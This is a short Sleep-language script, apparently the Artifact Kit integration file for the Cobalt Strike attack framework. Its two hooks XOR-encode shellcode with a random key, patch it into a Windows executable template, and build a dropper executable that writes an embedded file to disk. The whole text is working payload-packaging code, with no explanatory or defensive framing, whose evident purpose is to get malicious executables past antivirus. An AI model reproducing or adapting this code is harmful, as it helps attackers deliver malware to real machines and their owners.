# Artifact Kit Integration Script

# Windows Executables and DLLs
#
# Arguments
# 	$1 = artifact file (e.g., artifact32.exe)
# 	$2 = shellcode
# Return 
#	our generated artifact
set EXECUTABLE_ARTIFACT_GENERATOR {
	local('$handle $data $key $index $payload $resource $buffer $b $x');

	($resource, $payload) = @_;

	# try again or use the default artifact... I don't have it!
	if (!-exists script_resource($resource)) {
		return $null;
	}

	# read in the executable template
	$handle = openf(script_resource($resource));
	$data = readb($handle, -1);
	closef($handle);

	# generate a random key
	$key = @();
	$key[0] = int(rand() * 253) + 1;
	$key[1] = int(rand() * 253) + 1;
	$key[2] = int(rand() * 253) + 1;
	$key[3] = int(rand() * 253) + 1;

	# find the location of our data in the executable
	$index = indexOf($data, 'A' x 1024);

	# pack data into a buffer 
	$buffer = allocate(1024);

	# [offset of payload data in binary] - 4 bytes
	writeb($buffer, pack("i-", $index + 16));

	# [length of payload] - 4 bytes
	writeb($buffer, pack("i-", strlen($payload)));

	# [xor key] - 4 bytes
	writeb($buffer, chr($key[0]) );
	writeb($buffer, chr($key[1]) );
	writeb($buffer, chr($key[2]) );
	writeb($buffer, chr($key[3]) );

	# [padding] - 4 bytes
	writeb($buffer, 'aaaa');

	# pack our encoded payload into the buffer
	for ($x = 0; $x < strlen($payload); $x++) {
		writeb( $buffer, chr( (byteAt($payload, $x) ^ $key[$x % 4]) & 0xFF ) );
	}

	# retrieve the contents of the buffer.
	closef($buffer);
	$b = readb($buffer, -1);

	# return our encoded shellcode.
	return replaceAt($data, "$[1024]b", $index);
}

# Attacks -> Packages -> Windows Dropper
# 
# Arguments
# 	$1 = our previously patched executable
#       $2 = local path to file to include in the dropper.
#       $3 = name of file to drop to disk
# Return 
#	our generated Windows dropper artifact
set DROPPER_ARTIFACT_GENERATOR {
	local('$handle $dropme $file $data $blob $index $dropas');

	($data, $file, $dropas) = @_;

	# open the file to drop
	$handle = openf($file);
	$dropme = readb($handle, -1);
	closef($handle);

	# pack some info that the dropper will use
				# length of dropped file name + NULL terminator
						# length of dropped data
	$blob = pack("i-i-", strlen($dropas) + 1, strlen($dropme));

	# locate our patch location...
	$index = indexOf($data, 'DROPPER!');

	# patch our exe with the info
	$data = replaceAt($data, $blob, $index);

	# return our assembled file please
	return $data . "$dropas $+ \x00" . $dropme;
}
